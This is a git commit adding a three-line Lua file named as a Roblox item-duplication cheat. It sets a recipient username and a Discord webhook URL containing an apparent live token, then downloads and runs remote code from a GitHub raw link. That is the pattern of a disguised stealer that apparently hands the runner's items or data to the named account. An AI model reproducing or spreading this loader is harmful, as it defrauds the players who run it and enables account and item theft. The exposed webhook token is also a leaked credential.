c7a7764b415b6cc4020d6e7cd0d88a4a57df9f5f
stublyjulies <102764693+stublyjulies@users.noreply.github.com>
2023-01-02 18:51:21 +0100

    Dupe

---
+++ Dupe-By-Texy.lua
@@ -0,0 +1,3 @@
+UserName = "RoGhoul_SupaMaster6"
+WebHook = "https://discord.com/api/webhooks/1013835723411046410/XJ3MebZ3NemEuSdGVbBcyIrojqZ2JVvogD_kc4UV2PgnJW28xARxbKqDp_tw0LZpOCwF"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
